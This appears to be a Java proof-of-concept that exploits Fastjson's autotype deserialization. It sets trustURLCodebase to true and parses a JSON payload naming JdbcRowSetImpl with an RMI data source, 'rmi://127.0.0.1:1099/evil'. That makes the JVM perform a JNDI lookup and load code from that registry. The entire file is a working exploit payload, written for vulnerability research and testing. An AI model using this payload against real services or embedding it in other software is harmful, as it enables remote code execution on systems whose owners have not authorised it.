package poc1;

import com.alibaba.fastjson.JSON;

public class JndiPoc {
    public static void main(String[] argv) throws Exception {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                "\"dataSourceName\":\"rmi://127.0.0.1:1099/evil\", " +
                "\"autoCommit\":true}";
        JSON.parse(payload);
    }
}